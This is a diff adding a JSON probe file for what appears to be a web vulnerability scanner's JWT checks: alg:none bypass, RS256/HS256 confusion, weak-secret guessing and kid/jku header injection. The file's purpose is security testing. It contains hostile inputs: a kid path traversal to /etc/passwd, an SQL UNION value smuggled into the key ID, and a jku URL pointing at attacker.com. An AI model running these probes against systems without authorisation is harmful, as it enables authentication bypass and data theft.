@@ -1,0 +1,83 @@
+{
+  "category": "jwt",
+  "contexts": {
+    "alg_none": {
+      "description": "JWT algorithm none bypass — strip signature",
+      "tech_match": [],
+      "param_match": ["token", "jwt", "auth", "authorization", "access_token", "id_token"],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Test if server accepts JWT with alg:none (modify header to {\"alg\":\"none\"}, remove signature)",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "expired", "unauthorized", "denied"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "alg_confusion": {
+      "description": "JWT RS256 to HS256 algorithm confusion",
+      "tech_match": [],
+      "param_match": ["token", "jwt", "auth", "authorization"],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Change RS256 to HS256, sign with public key as HMAC secret",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "expired", "unauthorized"]}],
+          "severity": "critical",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "kid_injection": {
+      "description": "JWT kid parameter injection (path traversal / SQLi)",
+      "tech_match": [],
+      "param_match": ["token", "jwt", "auth"],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "kid: ../../etc/passwd — path traversal in key lookup",
+          "matchers": [{"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}],
+          "severity": "critical",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "kid: ' UNION SELECT 'key'-- — SQLi in key ID lookup",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "unauthorized"]}],
+          "severity": "critical",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "jku_injection": {
+      "description": "JWT jku/x5u header injection — attacker-controlled key URL",
+      "tech_match": [],
+      "param_match": ["token", "jwt", "auth"],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "jku: https://{{callback}}/jwks.json — SSRF via key URL",
+          "matchers": [{"type": "status", "status": [200]}],
+          "severity": "critical",
+          "confidence_boost": 50,
+          "variables": {"callback": "attacker.com"}
+        }
+      ]
+    },
+    "weak_secret": {
+      "description": "JWT signed with weak/common secrets",
+      "tech_match": [],
+      "param_match": ["token", "jwt", "auth", "authorization"],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Try common JWT secrets: secret, password, 123456, changeme, key",
+          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "unauthorized"]}],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    }
+  }
+}
